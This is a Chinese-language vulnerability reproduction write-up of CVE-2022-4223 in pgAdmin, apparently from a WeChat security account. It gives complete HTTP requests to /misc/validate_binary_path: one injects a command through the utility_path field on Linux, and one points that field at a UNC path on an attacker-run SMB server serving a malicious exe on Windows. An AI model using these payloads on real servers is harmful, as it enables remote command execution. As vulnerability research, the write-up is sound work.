#  CVE-2022-4223 pgAdmin = 6.16 未授权命令执行漏洞  
标准云
                    标准云  蚁景网络安全   2026-01-30 10:10  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/TL4Y9UAcgruibhUn2nvLrs9mLNiaB1EywEk5fekyWAgJHrFof41PrHYJk9f0jbpDxWZHe4bl66MTEcIkd6nIxvZA/640?wx_fmt=gif&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/TL4Y9UAcgrvzgWzuNlEGZ5oU9Q5H2uboSOKqd7s1xrshqsy6bCbcKN0jKUkj9gKFCBibu0LCwskTqwoocKuw62A/640?wx_fmt=other&from=appmsg "null")  
  
  
https://ftp.postgresql.org/pub/pgadmin/pgadmin4/v5.7/source/pgadmin4-5.7.tar.gz 下载 pgadmin5.7 的源码  
  
首先从代码层面进行分析  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/TL4Y9UAcgrvzgWzuNlEGZ5oU9Q5H2ubokw7RL9Rzj6pDyyt35DcoxicibpyAD1ndpAq1ahFuBHfzUNs9rgpCiauLg/640?wx_fmt=other&from=appmsg "null")  
  
  
接口 /validate_binary_path  
 最后调用了 subprocess.getoutput(  
来执行了命令  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/TL4Y9UAcgrvzgWzuNlEGZ5oU9Q5H2uboW5XFeoaDzmpMuUbkSCeq9DQ0K5X20zH98dPZEp3s9kpwt6Gksa42Jw/640?wx_fmt=other&from=appmsg "null")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/TL4Y9UAcgrvzgWzuNlEGZ5oU9Q5H2ubo8kR2HsBEnO1F0D5xYNyCPolu2wAFcPzhUpL9Dqichtu6mhwep1GwP5A/640?wx_fmt=other&from=appmsg "null")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/TL4Y9UAcgrvzgWzuNlEGZ5oU9Q5H2ubo5qnoFOL0Nz34QJJ8vFq64Xaic6EEvGqFteXHK0NpKNXWV0cyRhhm1Wg/640?wx_fmt=other&from=appmsg "null")  
  
  
这一部分代码是对传入的路径进行检测，如果是在 linux 下直接拼接，在windows 下部署，后缀中会添加 .exe  
 。同时 windows下恶意的exe文件必须是下面几个文件名之一 'pg_dump', 'pg_dumpall', 'pg_restore', 'psql'  
  
‍  
### linux  
  
可以从 docker hub 上搜索 docker 资源 https://hub.docker.com/search?q=pgadmin  
```
docker pull dpage/pgadmin4:6.16docker run -e 'PGADMIN_DEFAULT_EMAIL=test@example.com' -e 'PGADMIN_DEFAULT_PASSWORD=123456'  -p 5050:80 --name pgadmin -d  docker.io/dpage/pgadmin4:6.16
```  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/TL4Y9UAcgrvzgWzuNlEGZ5oU9Q5H2ubok1qmic8mvYeeG7t7qPzPLXhyn25zcFoo4ibrH3uYs1m02cqTo7DxJTibA/640?wx_fmt=other&from=appmsg "null")  
  
  
直接构造发送会提示 The CSRF token is missing.  
  
所以我们先请求路由 login  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/TL4Y9UAcgrvzgWzuNlEGZ5oU9Q5H2uboiajgtIXqNYLLvmE7OxiayWjEouL0ah72TCU5dicib4Ow3P64yDRgjxhUeA/640?wx_fmt=other&from=appmsg "null")  
  
image  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/TL4Y9UAcgrvzgWzuNlEGZ5oU9Q5H2uboiajgtIXqNYLLvmE7OxiayWjEouL0ah72TCU5dicib4Ow3P64yDRgjxhUeA/640?wx_fmt=other&from=appmsg "null")  
  
```
POST /misc/validate_binary_path HTTP/1.1Host: 127.0.0.1:5050Upgrade-Insecure-Requests: 1X-pgA-CSRFToken:ImI1OWE1NjQ3ZDZlYjBkYzFmMjgzYzE3MTEyMGRiZTA0MWYwM2YwMjgi.ZhUBBQ.S3V3X0JmCbEcwcpWZkf1TVYVRS4User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Sec-Fetch-Site: noneSec-Fetch-Mode: navigateSec-Fetch-Dest: documentAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: PGADMIN_LANGUAGE=en;pga4_session=bada494b-009f-4c04-bded-20497c5dcf74!pMVxVlI925/AqyV9Oq0RqiPecdo0fWg2hWYHxGDEpYc=;Connection: closeContent-Type: application/jsonContent-Length: 33{"utility_path":"a\";ifconfig;#"}
```  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/TL4Y9UAcgrvzgWzuNlEGZ5oU9Q5H2ubobibKctU3jIn5b9OuFQcQPcZmtkJC4cJIldwGvEvXf58UbuJUUZcicZHw/640?wx_fmt=other&from=appmsg "null")  
  
```
import osbinary_path = "a\";ifconfig;#"UTILITIES_ARRAY = ['pg_dump', 'pg_dumpall', 'pg_restore', 'psql']for utility in UTILITIES_ARRAY:    full_path = os.path.abspath(        os.path.join(binary_path, (utility if os.name != 'nt' else (utility + '.exe')))    )    print(full_path)
```  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/TL4Y9UAcgrvzgWzuNlEGZ5oU9Q5H2uboCAUA2hslC7xA6a4FoI7eZvqAib4YiaA3M8TgPQqr55M1zRbKHoibrxQ4w/640?wx_fmt=other&from=appmsg "null")  
  
  
我们简化代码在linux 下执行，最后利用;  
 分割执行命令  
### windows  
  
下载软件并进行安装 https://ftp.postgresql.org/pub/pgadmin/pgadmin4/v5.7/windows/pgadmin4-5.7-x64.exe  
  
我们发现同样在 windows 下拼接时是无法利用;  
 分割执行命令，但是可以通过 UNC path指定攻击者的恶意文件  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/TL4Y9UAcgrvzgWzuNlEGZ5oU9Q5H2uboRLhbCQ504T3zQrfmIXt1KXdJaAzibV2o764TxicAPibzKngicNFefWiaGww/640?wx_fmt=other&from=appmsg "null")  
  
```
import osbinary_path = "\\\\192.168.222.1\\TMP\\"UTILITIES_ARRAY = ['pg_dump', 'pg_dumpall', 'pg_restore', 'psql']for utility in UTILITIES_ARRAY:    full_path = os.path.abspath(        os.path.join(binary_path, (utility if os.name != 'nt' else (utility + '.exe')))    )    print(full_path)
```  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/TL4Y9UAcgrvzgWzuNlEGZ5oU9Q5H2uboINRX7NGpKVtGLnAib6ic0LzDno5yWFIPjmUqv8bkvQRTbxYhCEuxO4mg/640?wx_fmt=other&from=appmsg "null")  
  
  
我们发现通过构造传入参数，我们可以伪造共享地址  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/TL4Y9UAcgrvzgWzuNlEGZ5oU9Q5H2uboojuENYKhRQ1CwDJNzlV83ZtVsZD5cMVVjqJN9eoVyybwMHK6ZTnTBg/640?wx_fmt=other&from=appmsg "null")  
  
  
windows  下的环境始终无法启动 web 界面，因为环境实在太老了，启动  C:\Users\username\AppData\Local\Programs\pgAdmin 4\v5\web\setup.py  各种版本问题，一直没办法启动成功，所以只做理论上的验证  
  
后来我发现安装完成之后，会在界面下提供一个python目录，所以直接选择该python  来启动项目，需要把C:\Users\username\AppData\Local\Programs\pgAdmin 4\v5\web  下的config.py 修改 DEFAULT_SERVER = '0.0.0.0'  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/TL4Y9UAcgrvzgWzuNlEGZ5oU9Q5H2ubolcwfiahrraDyakR8dpmZVfIHuUjG5Nfjib61hnUnVVHYeicS0vvJNfj8A/640?wx_fmt=other&from=appmsg "null")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/TL4Y9UAcgrvzgWzuNlEGZ5oU9Q5H2uboXJEnZxc0S7icV5zGQKdeTZ9Dpg1WXm5SNfk6BG7fgGhWEw5PucHn2rQ/640?wx_fmt=other&from=appmsg "null")  
  
  
使用impacket提供的smbserver.py脚本构造恶意的smb服务 smbserver.py TMP /tmp  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/TL4Y9UAcgrvzgWzuNlEGZ5oU9Q5H2uboJ09hLqnPwibEnD8BSI9paHwIkuX9SYjTqDgLq6mjj14gt6YWsffmBPg/640?wx_fmt=other&from=appmsg "null")  
  
  
编译恶意的exe文件并放到对应目录  
- • pip install pyinstaller  
  
- • type execute_calc.pyimport subprocessdef execute_calc():    subprocess.call("calc.exe")if __name__ == "__main__":    execute_calc()  
  
- • pyinstaller --onefile execute_calc.py  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/TL4Y9UAcgrvzgWzuNlEGZ5oU9Q5H2ubolo21T3aCH6lgVkEMibBPpRK77EP15lgLIram69xcF6Q1QCQEJjFwDEQ/640?wx_fmt=other&from=appmsg "null")  
  
```
POST /misc/validate_binary_path HTTP/1.1Host: 192.168.222.145:5050Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36X-pgA-CSRFToken: Ijg5MDJjOGQ2YmVlNTA1NDMwZjFmODA1ZWNjYTIyNzg5MjExM2EzNDci.Zi3CIg.9u2mEcj30C2tPX0soO3L7tJrp5wAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: pga4_session=9cd07409-7aca-46c3-8635-e615a7fcd4ac!lthUHprxGzxRdWMWfPm1VLDOLpk=; Connection: closeContent-Type: application/jsonContent-Length: 45{"utility_path":"\\\\192.168.222.128\\TMP\\"}
```  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/TL4Y9UAcgrvzgWzuNlEGZ5oU9Q5H2uboicCc1Khuv6qRFMrJN9SSBElBHZUyPzRGcCeuxmCUY6LxictoxibJzsH8Q/640?wx_fmt=other&from=appmsg "null")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/TL4Y9UAcgrvzgWzuNlEGZ5oU9Q5H2uboEe8FaiapswqsqBgPHibRTsaRxCfojtQMQ55bibDydPSI1oMyjriaw3Lj5g/640?wx_fmt=other&from=appmsg "null")  
  
  
[](http://mp.weixin.qq.com/s?__biz=MzkyNTY3Nzc3Mg==&mid=2247484713&idx=1&sn=28c29e069e8bd8ceb0bb9b8724563a15&chksm=c1c3a48af6b42d9c05802480e731f8054250576e425306e620b110db89c7b6ea9451be2b4976&scene=21#wechat_redirect)  
  
  
